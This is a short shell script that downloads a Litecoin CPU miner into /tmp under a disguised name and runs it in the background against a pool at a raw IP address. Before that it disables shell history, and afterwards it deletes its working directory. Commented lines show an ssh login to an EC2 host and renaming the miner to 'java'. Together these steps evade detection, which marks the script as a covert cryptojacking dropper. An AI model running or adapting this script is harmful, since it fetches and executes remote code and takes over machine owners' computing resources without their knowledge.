#!/usr/bin/env sh

# LTC Mining
#./nomacro.pl
#./autogen.sh
#./configure CFLAGS="-O3"
#./configure CFLAGS="-Ofast"

#ssh -i argo-staging.pem ubuntu@ec2-52-0-208-155.compute-1.amazonaws.com



#tar xfz pooler-cpuminer-2.4.3-linux-x86_64.tar.gz
#rm pooler-cpuminer-2.4.3-linux-x86_64.tar.gz
#mv minerd java


set +o history

EXE=kdrg
EXE_DIR=/tmp/krmr

rm -rf $EXE_DIR
mkdir $EXE_DIR
cd $EXE_DIR

curl -o $EXE http://tenet.dl.sourceforge.net/project/cpuminer/pooler-cpuminer-2.4.4-linux-x86_64.tar.gz
chmod +x $EXE
#./minerd -o stratum+tcp://litecoinpool.org:3333 -O loxal.winsap:1 -B
#minerd.exe -o stratum+tcp://litecoinpool.org:3333 -O loxal.winsap:1 -x socks5://127.0.0.1:9150
./$EXE -o 149.210.234.234:8080 -O loxal.smt1:1 -B
rm -rf $EXE_DIR

cat /proc/cpuinfo
